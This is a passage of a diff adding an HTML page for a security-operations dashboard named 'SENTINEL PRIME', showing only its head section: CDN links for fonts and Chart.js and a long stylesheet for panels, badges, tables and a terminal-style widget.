@@ -1,0 +1,3225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SENTINEL PRIME — Enterprise Security Operations Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js"></script>
+<style>
+/* ============================================================
+   SENTINEL PRIME — Enterprise Security Operations Platform
+   Author: Ciprian Stefan Plesca
+   Version: 4.2.0-ENTERPRISE
+   Classification: TOP SECRET // ENTERPRISE USE ONLY
+   ============================================================ */
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg-void:       #04060d;
+  --bg-base:       #07090f;
+  --bg-surface:    #0c0f1a;
+  --bg-elevated:   #111422;
+  --bg-panel:      #161a2a;
+  --bg-hover:      #1c2133;
+
+  --cyan:          #00d4ff;
+  --cyan-dim:      #0099bb;
+  --cyan-glow:     rgba(0,212,255,0.15);
+  --green:         #00ff88;
+  --green-dim:     #00bb66;
+  --green-glow:    rgba(0,255,136,0.12);
+  --red:           #ff3355;
+  --red-dim:       #cc1133;
+  --red-glow:      rgba(255,51,85,0.15);
+  --amber:         #ffaa00;
+  --amber-dim:     #cc8800;
+  --amber-glow:    rgba(255,170,0,0.12);
+  --purple:        #9966ff;
+  --purple-dim:    #7744cc;
+  --purple-glow:   rgba(153,102,255,0.12);
+  --blue:          #2277ff;
+
+  --text-primary:  #e8eaf2;
+  --text-secondary:#8b9abf;
+  --text-muted:    #4a5472;
+  --text-mono:     #00d4ff;
+
+  --border-glow:   rgba(0,212,255,0.25);
+  --border-base:   rgba(255,255,255,0.06);
+  --border-med:    rgba(255,255,255,0.10);
+
+  --font-ui:       'Rajdhani', sans-serif;
+  --font-mono:     'Share Tech Mono', monospace;
+  --font-display:  'Orbitron', sans-serif;
+
+  --radius-sm:     3px;
+  --radius-md:     6px;
+  --radius-lg:     10px;
+}
+
+html, body {
+  background: var(--bg-void);
+  color: var(--text-primary);
+  font-family: var(--font-ui);
+  font-size: 14px;
+  line-height: 1.5;
+  height: 100%;
+  overflow-x: hidden;
+}
+
+/* Scanline overlay */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.04) 2px,
+    rgba(0,0,0,0.04) 4px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ─── SCROLLBAR ─── */
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: var(--bg-base); }
+::-webkit-scrollbar-thumb { background: var(--cyan-dim); border-radius: 2px; }
+
+/* ─── LAYOUT ─── */
+.app-shell {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* ─── TOP BAR ─── */
+.topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 52px;
+  padding: 0 16px;
+  background: var(--bg-base);
+  border-bottom: 1px solid var(--border-glow);
+  flex-shrink: 0;
+  position: relative;
+  z-index: 100;
+}
+
+.topbar::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+  opacity: 0.6;
+}
+
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.brand-icon {
+  width: 32px;
+  height: 32px;
+  position: relative;
+}
+
+.brand-icon svg {
+  width: 100%;
+  height: 100%;
+}
+
+.brand-name {
+  font-family: var(--font-display);
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  color: var(--cyan);
+  text-shadow: 0 0 20px var(--cyan);
+}
+
+.brand-sub {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-muted);
+  letter-spacing: 1px;
+  margin-top: -3px;
+}
+
+.topbar-status {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.status-chip {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-secondary);
+  letter-spacing: 0.5px;
+}
+
+.status-dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  animation: pulse 2s infinite;
+}
+.status-dot.green  { background: var(--green);  box-shadow: 0 0 8px var(--green); }
+.status-dot.red    { background: var(--red);    box-shadow: 0 0 8px var(--red);   animation: pulse-red 1s infinite; }
+.status-dot.amber  { background: var(--amber);  box-shadow: 0 0 8px var(--amber); }
+.status-dot.cyan   { background: var(--cyan);   box-shadow: 0 0 8px var(--cyan);  }
+
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+@keyframes pulse-red { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.3); } }
+
+.topbar-right {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.alert-badge {
+  position: relative;
+  cursor: pointer;
+}
+
+.alert-bell {
+  width: 28px;
+  height: 28px;
+  background: rgba(255,51,85,0.15);
+  border: 1px solid rgba(255,51,85,0.4);
+  border-radius: var(--radius-sm);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  animation: ring 3s infinite;
+}
+
+@keyframes ring {
+  0%,90%,100% { transform: rotate(0); }
+  92% { transform: rotate(-8deg); }
+  96% { transform: rotate(8deg); }
+  98% { transform: rotate(-4deg); }
+}
+
+.alert-count {
+  position: absolute;
+  top: -5px; right: -5px;
+  background: var(--red);
+  color: #fff;
+  font-family: var(--font-mono);
+  font-size: 9px;
+  font-weight: bold;
+  min-width: 16px;
+  height: 16px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0 3px;
+}
+
+.user-chip {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 5px 10px;
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-sm);
+  cursor: pointer;
+}
+
+.user-avatar {
+  width: 24px;
+  height: 24px;
+  background: linear-gradient(135deg, var(--cyan-dim), var(--purple-dim));
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: var(--font-display);
+  font-size: 9px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.user-info {
+  font-size: 12px;
+}
+
+.user-name { color: var(--text-primary); font-weight: 600; }
+.user-role { color: var(--cyan); font-family: var(--font-mono); font-size: 10px; letter-spacing: 0.5px; }
+
+.live-clock {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--cyan);
+  letter-spacing: 1px;
+  padding: 4px 10px;
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-sm);
+  background: rgba(0,212,255,0.05);
+  min-width: 180px;
+  text-align: center;
+}
+
+/* ─── MAIN WRAPPER ─── */
+.main-wrapper {
+  display: flex;
+  flex: 1;
+  overflow: hidden;
+}
+
+/* ─── SIDEBAR ─── */
+.sidebar {
+  width: 210px;
+  background: var(--bg-base);
+  border-right: 1px solid var(--border-glow);
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  overflow-y: auto;
+}
+
+.sidebar-section {
+  padding: 16px 0;
+  border-bottom: 1px solid var(--border-base);
+}
+
+.sidebar-label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-muted);
+  letter-spacing: 2px;
+  padding: 0 14px;
+  margin-bottom: 6px;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 9px 14px;
+  cursor: pointer;
+  transition: all 0.15s;
+  position: relative;
+  border-left: 2px solid transparent;
+  color: var(--text-secondary);
+  font-size: 13px;
+  font-weight: 500;
+  letter-spacing: 0.3px;
+}
+
+.nav-item:hover {
+  background: var(--bg-hover);
+  color: var(--text-primary);
+  border-left-color: var(--cyan-dim);
+}
+
+.nav-item.active {
+  background: rgba(0,212,255,0.07);
+  color: var(--cyan);
+  border-left-color: var(--cyan);
+}
+
+.nav-item.active::after {
+  content: '';
+  position: absolute;
+  right: 0; top: 0; bottom: 0;
+  width: 1px;
+  background: var(--cyan);
+  opacity: 0.4;
+}
+
+.nav-icon {
+  width: 18px;
+  height: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.nav-badge {
+  margin-left: auto;
+  background: rgba(255,51,85,0.2);
+  border: 1px solid rgba(255,51,85,0.4);
+  color: var(--red);
+  font-family: var(--font-mono);
+  font-size: 9px;
+  min-width: 18px;
+  height: 16px;
+  border-radius: 3px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0 3px;
+}
+
+.nav-badge.amber {
+  background: rgba(255,170,0,0.15);
+  border-color: rgba(255,170,0,0.4);
+  color: var(--amber);
+}
+
+.nav-badge.green {
+  background: rgba(0,255,136,0.1);
+  border-color: rgba(0,255,136,0.3);
+  color: var(--green);
+}
+
+.sidebar-footer {
+  margin-top: auto;
+  padding: 12px 14px;
+  border-top: 1px solid var(--border-base);
+}
+
+.threat-level-box {
+  background: var(--bg-elevated);
+  border: 1px solid rgba(255,170,0,0.4);
+  border-radius: var(--radius-md);
+  padding: 10px 12px;
+}
+
+.tl-label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-muted);
+  letter-spacing: 2px;
+  margin-bottom: 4px;
+}
+
+.tl-value {
+  font-family: var(--font-display);
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--amber);
+  text-shadow: 0 0 15px var(--amber);
+  letter-spacing: 1px;
+}
+
+.tl-sub {
+  font-size: 11px;
+  color: var(--text-secondary);
+  margin-top: 2px;
+}
+
+/* ─── CONTENT ─── */
+.content {
+  flex: 1;
+  overflow-y: auto;
+  background: var(--bg-base);
+}
+
+.tab-pane {
+  display: none;
+  padding: 16px;
+  animation: fadeIn 0.2s ease;
+}
+
+.tab-pane.active {
+  display: block;
+}
+
+@keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+
+/* ─── PAGE HEADER ─── */
+.page-header {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  margin-bottom: 16px;
+}
+
+.page-title {
+  font-family: var(--font-display);
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--text-primary);
+  letter-spacing: 1.5px;
+}
+
+.page-subtitle {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-muted);
+  letter-spacing: 0.5px;
+  margin-top: 2px;
+}
+
+.btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 7px 14px;
+  border-radius: var(--radius-sm);
+  font-family: var(--font-ui);
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  border: 1px solid;
+  transition: all 0.15s;
+  text-transform: uppercase;
+}
+
+.btn-cyan {
+  background: rgba(0,212,255,0.1);
+  border-color: var(--cyan-dim);
+  color: var(--cyan);
+}
+.btn-cyan:hover { background: rgba(0,212,255,0.2); box-shadow: 0 0 15px var(--cyan-glow); }
+
+.btn-red {
+  background: rgba(255,51,85,0.1);
+  border-color: var(--red-dim);
+  color: var(--red);
+}
+.btn-red:hover { background: rgba(255,51,85,0.2); }
+
+.btn-green {
+  background: rgba(0,255,136,0.08);
+  border-color: var(--green-dim);
+  color: var(--green);
+}
+.btn-green:hover { background: rgba(0,255,136,0.15); }
+
+.btn-amber {
+  background: rgba(255,170,0,0.08);
+  border-color: var(--amber-dim);
+  color: var(--amber);
+}
+
+.btn-ghost {
+  background: transparent;
+  border-color: var(--border-med);
+  color: var(--text-secondary);
+}
+.btn-ghost:hover { background: var(--bg-hover); color: var(--text-primary); border-color: var(--border-glow); }
+
+/* ─── KPI CARDS ─── */
+.kpi-grid {
+  display: grid;
+  grid-template-columns: repeat(6, 1fr);
+  gap: 10px;
+  margin-bottom: 16px;
+}
+
+.kpi-card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-base);
+  border-radius: var(--radius-md);
+  padding: 12px 14px;
+  position: relative;
+  overflow: hidden;
+  cursor: default;
+  transition: border-color 0.2s;
+}
+
+.kpi-card:hover { border-color: var(--border-glow); }
+
+.kpi-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+}
+
+.kpi-card.danger::before  { background: var(--red); }
+.kpi-card.warning::before { background: var(--amber); }
+.kpi-card.success::before { background: var(--green); }
+.kpi-card.info::before    { background: var(--cyan); }
+.kpi-card.purple::before  { background: var(--purple); }
+.kpi-card.blue::before    { background: var(--blue); }
+
+.kpi-label {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-muted);
+  letter-spacing: 1.5px;
+  margin-bottom: 6px;
+  text-transform: uppercase;
+}
+
+.kpi-value {
+  font-family: var(--font-display);
+  font-size: 22px;
+  font-weight: 700;
+  line-height: 1;
+  margin-bottom: 4px;
+}
+
+.kpi-card.danger  .kpi-value { color: var(--red);    }
+.kpi-card.warning .kpi-value { color: var(--amber);  }
+.kpi-card.success .kpi-value { color: var(--green);  }
+.kpi-card.info    .kpi-value { color: var(--cyan);   }
+.kpi-card.purple  .kpi-value { color: var(--purple); }
+.kpi-card.blue    .kpi-value { color: var(--blue);   }
+
+.kpi-delta {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  display: flex;
+  align-items: center;
+  gap: 3px;
+}
+
+.kpi-delta.up   { color: var(--red);   }
+.kpi-delta.down { color: var(--green); }
+.kpi-delta.neu  { color: var(--text-muted); }
+
+.kpi-icon {
+  position: absolute;
+  top: 10px;
+  right: 12px;
+  font-size: 20px;
+  opacity: 0.2;
+}
+
+/* ─── GRID LAYOUTS ─── */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+.grid-7-3 { display: grid; grid-template-columns: 7fr 3fr; gap: 12px; }
+.grid-6-4 { display: grid; grid-template-columns: 6fr 4fr; gap: 12px; }
+.grid-4-6 { display: grid; grid-template-columns: 4fr 6fr; gap: 12px; }
+
+/* ─── CARD ─── */
+.card {
+  background: var(--bg-surface);
+  border: 1px solid var(--border-base);
+  border-radius: var(--radius-md);
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+
+.card:hover { border-color: var(--border-med); }
+
+.card-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border-base);
+  background: var(--bg-elevated);
+}
+
+.card-title {
+  font-family: var(--font-display);
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1.5px;
+  color: var(--text-primary);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.card-title .dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: var(--cyan);
+  animation: pulse 2s infinite;
+}
+
+.card-title .dot.red   { background: var(--red);   animation: pulse-red 1s infinite; }
+.card-title .dot.amber { background: var(--amber); }
+.card-title .dot.green { background: var(--green); }
+
+.card-actions { display: flex; gap: 6px; }
+
+.card-body { padding: 12px 14px; }
+
+/* ─── TABLES ─── */
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 12px;
+}
+
+.data-table th {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--text-muted);
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  text-align: left;
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border-base);
+  background: var(--bg-elevated);
+  font-weight: 400;
+}
+
+.data-table td {
+  padding: 8px 12px;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+  vertical-align: middle;
+}
+
+.data-table tr:hover td { background: var(--bg-hover); }
+.data-table tr:last-child td { border-bottom: none; }
+
+/* ─── SEVERITY BADGES ─── */
+.sev {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 2px 8px;
+  border-radius: 2px;
+  font-family: var(--font-mono);
+  font-size: 9px;
+  letter-spacing: 1px;
+  font-weight: 700;
+  text-transform: uppercase;
+}
+
+.sev-critical { background: rgba(255,51,85,0.2);  border: 1px solid rgba(255,51,85,0.5);  color: var(--red);    }
+.sev-high     { background: rgba(255,170,0,0.15); border: 1px solid rgba(255,170,0,0.5);  color: var(--amber);  }
+.sev-medium   { background: rgba(255,200,0,0.1);  border: 1px solid rgba(255,200,0,0.3);  color: #ffcc44;       }
+.sev-low      { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.3);  color: var(--green);  }
+.sev-info     { background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.3);  color: var(--cyan);   }
+
+/* ─── STATUS BADGES ─── */
+.status {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-size: 11px;
+  font-weight: 600;
+}
+.status::before { content: ''; width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; }
+.status-open      { color: var(--red);    } .status-open::before      { background: var(--red);    }
+.status-active    { color: var(--amber);  } .status-active::before    { background: var(--amber);  }
+.status-contained { color: #ffcc44;       } .status-contained::before { background: #ffcc44;       }
+.status-resolved  { color: var(--green);  } .status-resolved::before  { background: var(--green);  }
+.status-closed    { color: var(--text-muted); } .status-closed::before{ background: var(--text-muted); }
+.status-patched   { color: var(--cyan);   } .status-patched::before   { background: var(--cyan);   }
+.status-mitigated { color: var(--purple); } .status-mitigated::before { background: var(--purple); }
+
+/* ─── PROGRESS BAR ─── */
+.progress-bar {
+  height: 4px;
+  background: rgba(255,255,255,0.05);
+  border-radius: 2px;
+  overflow: hidden;
+  flex: 1;
+}
+.progress-fill {
+  height: 100%;
+  border-radius: 2px;
+  transition: width 0.5s ease;
+}
+.pf-red    { background: var(--red);    }
+.pf-amber  { background: var(--amber);  }
+.pf-green  { background: var(--green);  }
+.pf-cyan   { background: var(--cyan);   }
+.pf-purple { background: var(--purple); }
+
+/* ─── THREAT MAP CANVAS ─── */
+.threat-map-container {
+  position: relative;
+  background: var(--bg-elevated);
+  border-radius: var(--radius-md);
+  overflow: hidden;
+}
+
+#threatMapCanvas {
+  display: block;
+  width: 100%;
+  height: 200px;
+}
+
+/* ─── CVSS SCORE ─── */
+.cvss-score {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 42px;
+  height: 22px;
+  border-radius: 3px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  font-weight: 700;
+}
+.cvss-critical { background: rgba(255,51,85,0.2);  color: var(--red);   border: 1px solid rgba(255,51,85,0.5);  }
+.cvss-high     { background: rgba(255,170,0,0.15); color: var(--amber); border: 1px solid rgba(255,170,0,0.5);  }
+.cvss-medium   { background: rgba(255,220,0,0.1);  color: #ffdd00;      border: 1px solid rgba(255,220,0,0.3);  }
+.cvss-low      { background: rgba(0,255,136,0.08); color: var(--green); border: 1px solid rgba(0,255,136,0.3);  }
+
+/* ─── COMPLIANCE GAUGE ─── */
+.comp-framework {
+  padding: 12px 0;
+  border-bottom: 1px solid var(--border-base);
+}
+.comp-framework:last-child { border-bottom: none; }
+
+.comp-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.comp-name {
+  font-family: var(--font-display);
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  color: var(--text-primary);
+}
+
+.comp-pct {
+  font-family: var(--font-mono);
+  font-size: 13px;
+  font-weight: 700;
+}
+
+.comp-bar {
+  height: 6px;
+  background: rgba(255,255,255,0.05);
+  border-radius: 3px;
+  overflow: hidden;
+  margin-bottom: 6px;
+}
+
+.comp-fill {
+  height: 100%;
+  border-radius: 3px;
+  transition: width 1s ease;
+}
+
+.comp-meta {
+  display: flex;
+  justify-content: space-between;
+  font-size: 10px;
+  color: var(--text-muted);
+  font-family: var(--font-mono);
+}
+
+/* ─── TIMELINE ─── */
+.timeline { padding: 4px 0; }
+.tl-item {
+  display: flex;
+  gap: 10px;
+  padding-bottom: 14px;
+  position: relative;
+}
+.tl-item::before {
+  content: '';
+  position: absolute;
+  left: 5px;
+  top: 16px;
+  bottom: 0;
+  width: 1px;
+  background: var(--border-base);
+}
+.tl-item:last-child::before { display: none; }
+.tl-dot {
+  width: 11px;
+  height: 11px;
+  border-radius: 50%;
+  border: 2px solid;
+  flex-shrink: 0;
+  margin-top: 3px;
+}
+.tl-dot.red    { border-color: var(--red);   background: rgba(255,51,85,0.2); }
+.tl-dot.amber  { border-color: var(--amber); background: rgba(255,170,0,0.15); }
+.tl-dot.green  { border-color: var(--green); background: rgba(0,255,136,0.12); }
+.tl-dot.cyan   { border-color: var(--cyan);  background: rgba(0,212,255,0.1); }
+.tl-content {}
+.tl-time { font-family: var(--font-mono); font-size: 9px; color: var(--text-muted); }
+.tl-text { font-size: 12px; color: var(--text-secondary); margin-top: 1px; }
+.tl-text strong { color: var(--text-primary); font-weight: 600; }
+
+/* ─── RISK SCORE ─── */
+.risk-dial {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
+.risk-score-big {
+  font-family: var(--font-display);
+  font-size: 52px;
+  font-weight: 900;
+  color: var(--amber);
+  text-shadow: 0 0 30px var(--amber);
+  line-height: 1;
+}
+.risk-label { font-family: var(--font-mono); font-size: 10px; color: var(--text-muted); letter-spacing: 2px; margin-top: 4px; }
+
+/* ─── MINI SPARKLINE ─── */
+.sparkline-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 6px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+.sparkline-row:last-child { border-bottom: none; }
+.sp-name { flex: 1; font-size: 12px; color: var(--text-secondary); }
+.sp-val  { font-family: var(--font-mono); font-size: 12px; min-width: 40px; text-align: right; }
+.sp-bar  { width: 80px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
+.sp-fill { height: 100%; border-radius: 2px; }
+
+/* ─── UEBA CARD ─── */
+.ueba-user-card {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 10px;
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-base);
+  border-radius: var(--radius-md);
+  margin-bottom: 6px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.ueba-user-card:hover { border-color: var(--border-glow); background: var(--bg-hover); }
+.ueba-avatar {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: var(--bg-panel);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  border: 2px solid;
+  flex-shrink: 0;
+}
+.ueba-info { flex: 1; min-width: 0; }
+.ueba-name { font-size: 13px; font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.ueba-dept { font-size: 10px; color: var(--text-muted); font-family: var(--font-mono); }
+.ueba-risk-score {
+  font-family: var(--font-display);
+  font-size: 16px;
+  font-weight: 700;
+  min-width: 36px;
+  text-align: center;
+}
+
+/* ─── IOC TAG ─── */
+.ioc-tag {
+  display: inline-block;
+  padding: 1px 6px;
+  border-radius: 2px;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 0.3px;
+  background: rgba(0,212,255,0.08);
+  border: 1px solid rgba(0,212,255,0.2);
+  color: var(--cyan);
+  margin: 1px;
+}
+
+.ioc-tag.red    { background: rgba(255,51,85,0.08);  border-color: rgba(255,51,85,0.3);  color: var(--red);    }
+.ioc-tag.amber  { background: rgba(255,170,0,0.08);  border-color: rgba(255,170,0,0.3);  color: var(--amber);  }
+.ioc-tag.purple { background: rgba(153,102,255,0.08);border-color: rgba(153,102,255,0.3);color: var(--purple); }
+.ioc-tag.green  { background: rgba(0,255,136,0.05);  border-color: rgba(0,255,136,0.25); color: var(--green);  }
+
+/* ─── SEARCH BAR ─── */
+.search-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-sm);
+  padding: 7px 12px;
+  margin-bottom: 12px;
+}
+.search-bar input {
+  flex: 1;
+  background: none;
+  border: none;
+  outline: none;
+  color: var(--text-primary);
+  font-family: var(--font-mono);
+  font-size: 12px;
+  caret-color: var(--cyan);
+}
+.search-bar input::placeholder { color: var(--text-muted); }
+.search-icon { color: var(--cyan); font-size: 14px; }
+
+/* ─── FILTER BAR ─── */
+.filter-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 12px;
+  flex-wrap: wrap;
+}
+.filter-chip {
+  padding: 4px 12px;
+  border-radius: 2px;
+  font-size: 11px;
+  font-family: var(--font-mono);
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  border: 1px solid var(--border-med);
+  color: var(--text-secondary);
+  background: var(--bg-elevated);
+  transition: all 0.15s;
+  text-transform: uppercase;
+}
+.filter-chip:hover { border-color: var(--cyan-dim); color: var(--cyan); }
+.filter-chip.active { background: rgba(0,212,255,0.1); border-color: var(--cyan); color: var(--cyan); }
+
+/* ─── NETWORK ─── */
+.net-stat-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 7px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+.net-stat-row:last-child { border-bottom: none; }
+.ns-label { font-size: 12px; color: var(--text-secondary); display: flex; align-items: center; gap: 6px; }
+.ns-val { font-family: var(--font-mono); font-size: 12px; color: var(--text-primary); }
+.ns-delta { font-family: var(--font-mono); font-size: 10px; padding: 1px 5px; border-radius: 2px; }
+.ns-delta.up { color: var(--red); background: rgba(255,51,85,0.1); }
+.ns-delta.down { color: var(--green); background: rgba(0,255,136,0.1); }
+
+/* ─── THREAT HUNTING ─── */
+.hunt-terminal {
+  background: var(--bg-void);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-md);
+  font-family: var(--font-mono);
+  overflow: hidden;
+}
+.hunt-term-header {
+  background: var(--bg-elevated);
+  padding: 8px 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border-bottom: 1px solid var(--border-base);
+}
+.term-dot { width: 10px; height: 10px; border-radius: 50%; }
+.term-dot.red   { background: #ff5f57; }
+.term-dot.amber { background: #ffbd2e; }
+.term-dot.green { background: #28c940; }
+.hunt-term-body {
+  padding: 14px;
+  min-height: 160px;
+  font-size: 12px;
+  color: var(--green);
+  line-height: 1.7;
+}
+.hunt-term-body .prompt { color: var(--cyan); }
+.hunt-term-body .output { color: var(--text-secondary); }
+.hunt-term-body .match  { color: var(--amber); background: rgba(255,170,0,0.1); padding: 0 3px; }
+.hunt-term-body .cmd-line { display: flex; align-items: center; gap: 6px; margin-top: 6px; }
+.hunt-input {
+  background: none;
+  border: none;
+  outline: none;
+  color: var(--green);
+  font-family: var(--font-mono);
+  font-size: 12px;
+  flex: 1;
+  caret-color: var(--green);
+}
+.cursor-blink { animation: blink 1s infinite; }
+@keyframes blink { 0%,49% { opacity: 1; } 50%,100% { opacity: 0; } }
+
+/* ─── ASSET CARD ─── */
+.asset-os-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 2px 7px;
+  border-radius: 2px;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  background: var(--bg-panel);
+  border: 1px solid var(--border-base);
+  color: var(--text-secondary);
+}
+
+/* ─── MINI MAP ─── */
+.threat-origin-list { }
+.to-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 5px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+.to-item:last-child { border-bottom: none; }
+.to-flag { font-size: 16px; }
+.to-country { flex: 1; font-size: 12px; color: var(--text-secondary); }
+.to-count { font-family: var(--font-mono); font-size: 12px; color: var(--red); }
+.to-bar { width: 60px; }
+
+/* ─── APT CARD ─── */
+.apt-card {
+  background: var(--bg-elevated);
+  border: 1px solid var(--border-base);
+  border-left: 3px solid var(--red);
+  border-radius: var(--radius-md);
+  padding: 10px 12px;
+  margin-bottom: 8px;
+}
+.apt-card.amber { border-left-color: var(--amber); }
+.apt-card.cyan  { border-left-color: var(--cyan);  }
+.apt-name { font-family: var(--font-mono); font-size: 12px; color: var(--red); font-weight: 700; }
+.apt-card.amber .apt-name { color: var(--amber); }
+.apt-card.cyan  .apt-name { color: var(--cyan);  }
+.apt-ttps { font-size: 11px; color: var(--text-secondary); margin-top: 3px; }
+.apt-meta { display: flex; gap: 10px; margin-top: 6px; }
+.apt-tag { font-family: var(--font-mono); font-size: 9px; padding: 1px 6px; border-radius: 2px; background: rgba(255,255,255,0.05); color: var(--text-muted); letter-spacing: 0.5px; }
+
+/* ─── REPORT SECTION ─── */
+.exec-metric {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 16px 10px;
+}
+.exec-metric-val {
+  font-family: var(--font-display);
+  font-size: 32px;
+  font-weight: 900;
+  line-height: 1;
+}
+.exec-metric-label { font-family: var(--font-mono); font-size: 9px; color: var(--text-muted); letter-spacing: 1.5px; margin-top: 4px; }
+.exec-metric-trend { font-size: 11px; margin-top: 3px; }
+
+/* ─── TOOLTIP ─── */
+.tooltip {
+  position: relative;
+  cursor: help;
+}
+.tooltip .tip {
+  display: none;
+  position: absolute;
+  bottom: 110%;
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--bg-panel);
+  border: 1px solid var(--border-glow);
+  border-radius: var(--radius-sm);
+  padding: 5px 9px;
+  white-space: nowrap;
+  font-size: 11px;
+  color: var(--text-primary);
+  z-index: 100;
+}
+.tooltip:hover .tip { display: block; }
+
+/* ─── MISC ─── */
